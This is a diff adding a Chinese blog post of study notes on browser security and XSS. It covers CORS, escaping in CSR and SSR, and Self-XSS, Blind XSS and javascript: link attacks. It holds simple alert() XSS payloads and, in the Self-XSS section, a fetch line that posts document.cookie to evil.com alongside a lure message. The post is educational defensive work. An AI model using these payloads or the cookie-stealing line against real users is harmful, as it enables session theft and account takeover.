@@ -1,0 +1,154 @@
+---
+title: 前端資安宇宙（一）- 瀏覽器與XSS
+date: '2025-06-15'
+tags: ['資安', 'XSS', '前端']
+draft: false
+summary: '本文介紹瀏覽器的安全限制、XSS 的攻擊類型與實際範例，並整理 CSR/SSR 在防範 XSS 上的差異與常見誤區。'
+---
+
+## 前言
+
+身為一個網頁軟體工程師，資安這塊是非常用重要的，雖然現在大多都在做內部系統，但是面試還是會常常問到，所以我乾脆與我們公司前端一起辦了場資安讀書會。
+本文章會參考胡立大大寫的 [Beyond XSS：探索網頁前端資安宇宙](https://www.tenlong.com.tw/products/9786267383803)。
+
+## 瀏覽器不能做的事？
+
+1. **禁止呼叫本機檔案**
+
+2. **禁止呼叫系統 API**
+   - 存取本地 registry
+   - 讀寫磁碟任意路徑
+   - 自動安裝軟體（需確認）
+   - 開啟攝像頭或音訊設備 [需確認](https://support.google.com/chrome/answer/2693767?hl=zh-HK&co=GENIE.Platform%3DAndroid)
+
+3. **禁止取得其他網站的內容**
+   - 如果你在 Yahoo 網頁中嘗試這樣寫：
+
+     ```js
+     fetch('https://google.com')
+       .then((res) => res.json())
+       .then((data) => console.log(data))
+       .catch((err) => console.error('被阻擋！', err))
+     ```
+
+     預期會出現錯誤：
+
+     ```
+     Access to fetch at 'https://google.com/' from origin 'https://tw.yahoo.com'
+     has been blocked by CORS policy:
+     No 'Access-Control-Allow-Origin' header is present on the requested resource.
+
+     GET https://google.com/ net::ERR_FAILED 301 (Moved Permanently)
+
+     TypeError: Failed to fetch
+
+     被阻擋！ TypeError: Failed to fetch
+     ```
+
+   - **無法跨站取得 cookie**
+     - 同源政策限制 `document.cookie` 只能讀取「自己的網站」設定的 cookie。
+     - 若 cookie 有 `HttpOnly` 屬性，JavaScript 永遠無法取得。（可避免 XSS 攻擊）
+
+---
+
+# 什麼是 XSS？
+
+XSS（Cross-Site Scripting，跨站腳本攻擊）是一種前端常見的資安攻擊手法。  
+簡單來說，就是**攻擊者在其他人的網站上注入惡意的 JavaScript 程式碼，並讓其他使用者在不知情的情況下執行它**。
+
+---
+
+## 常見的 XSS 攻擊範例
+
+1. 在輸入框中輸入以下內容，若未適當處理就會執行：
+   ```html
+   <script>
+     alert('XSS!')
+   </script>
+   ```
+2. 偽協議，惡意連結：
+   ```html
+   <a href="javascript:alert('Hacked!')">點我</a>
+   ```
+3. 偽裝圖片：
+
+```html
+<img src="x" onerror="alert('XSS!')" />
+```
+
+---
+
+## CSR vs SSR 在 XSS 防範上的差異
+
+### CSR（Client-Side Rendering，前端渲染）
+
+- **預設具備基本防護**
+  - 如 React、Vue 等框架在輸出變數時，會自動將 HTML 特殊符號做轉義（escape）。
+  - 例如使用者輸入 `<script>alert(1)</script>`，畫面會呈現為純文字：
+    ```html
+    &lt;script&gt;alert(1)&lt;/script&gt;
+    ```
+    而非直接執行。
+
+- **風險來源**
+  - 若開發者使用以下方式將內容「直接插入 HTML」，會導致 XSS 風險：
+    - React: `dangerouslySetInnerHTML`
+    - Vue: `v-html` [連結](https://cn.vuejs.org/api/built-in-directives#v-html`)
+    - 原生 JavaScript: `element.innerHTML`
+
+- **只要不使用危險 API，CSR 預設就有不錯的 XSS 防護能力**
+
+---
+
+### SSR（Server-Side Rendering，伺服器渲染）
+
+- **需要開發者自行轉義輸出內容**
+  - 若從後端回傳 HTML 字串時，未將使用者輸入進行轉義，會造成 XSS 漏洞。
+
+- **常見問題**
+  - 使用樣板引擎時誤用未轉義語法：
+    - EJS: `<%- userInput %>`
+
+## 其他類型的 XSS
+
+### Self-XSS（自我 XSS）
+
+Self-XSS 是一種社交工程攻擊，攻擊者會誘導使用者**自己在開發者工具（Console）中貼上並執行惡意程式碼**。  
+雖然程式碼是由使用者自己執行的，但實際上資料仍會被竊取或帳號遭入侵。
+
+---
+
+#### 常見誘導語句：
+
+> 「你贏得了禮物！請打開開發者工具（F12），將以下程式碼貼上後就能獲得！」
+
+```js
+fetch('https://evil.com/steal-cookie', {
+  method: 'POST',
+  body: document.cookie,
+})
+```
+
+### Blind XSS（盲目型 XSS）
+
+Blind XSS 是一種更隱蔽的 XSS 攻擊。  
+攻擊者將惡意腳本注入到系統中，但**不是立即在瀏覽者端觸發**，而是等到某個「後台管理者」或「內部人員」在**不同頁面或系統中查看資料時**才會觸發。
+
+### 偽協議 XSS（JavaScript 協議攻擊）
+
+偽協議攻擊是指攻擊者在超連結（`<a>` 標籤）中，使用 `javascript:` 協議來執行惡意腳本。  
+這種方式常見於釣魚連結、留言注入等 XSS 攻擊中。
+
+---
+
+#### 攻擊範例：
+
+```html
+<a href="javascript:alert('Hacked!')">點我領取獎勵！</a>
+```
+
+如何解決？
+
+```
+使用sanitize-url套件
+```
